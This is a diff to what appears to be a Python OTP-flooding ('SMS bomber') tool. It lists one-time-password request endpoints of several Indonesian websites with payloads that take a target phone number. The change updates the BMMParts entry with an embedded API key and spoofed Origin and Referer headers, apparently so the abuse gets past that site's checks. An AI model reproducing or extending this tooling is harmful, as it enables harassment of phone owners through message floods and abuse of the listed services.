@@ -35,6 +35,6 @@ def _x(ph):
         ("1itmedia","https://api.1itmedia.co.id/oauth/fa_otp",{"Content-Type":"application/x-www-form-urlencoded"},{"username":_f08(ph),"otp_type":"null","is_form":True}),
         ("Carro","https://carro.co/_actions/requestOtp",{"Content-Type":"application/json","Accept":"application/json"},{"countryCode":"id","locale":"id","mobileNumber":_fplus(ph),"provider":"whatsapp","recaptchaResponse":"","recaptchaAction":"id_idid_requestOtp"}),
         ("BodyShop","https://ms-api.thebodyshop.co.id/users/v1/otp/request",{"Content-Type":"application/json","Accept":"application/json"},{"identifier":_f08(ph),"otpType":"WA"}),
-        ("BMMParts","https://bmmparts.co.id/api/v1/auth/request-otp",{"Content-Type":"application/json","Accept":"application/json"},{"phoneNumber":_f08(ph)}),
+        ("BMMParts","https://bmmparts.co.id/api/v1/auth/request-otp",{"Content-Type":"application/json","Accept":"*/*","Api-Key":"28EBBA656ED772A7BF319A79D1FBDB051411DCB7AF47DD09845FF5F7F09267E0","Origin":"https://bmmparts.co.id","Referer":"https://bmmparts.co.id/login"},{"phoneNumber":_fnocode(ph)}),
         ("Edelweiss","https://devel-cnn.edelweiss.id/api/auth/otp/send",{"Content-Type":"application/json","Accept":"application/json"},{"phone":_fplus(ph)}),
-    ]
+                                                                        ]
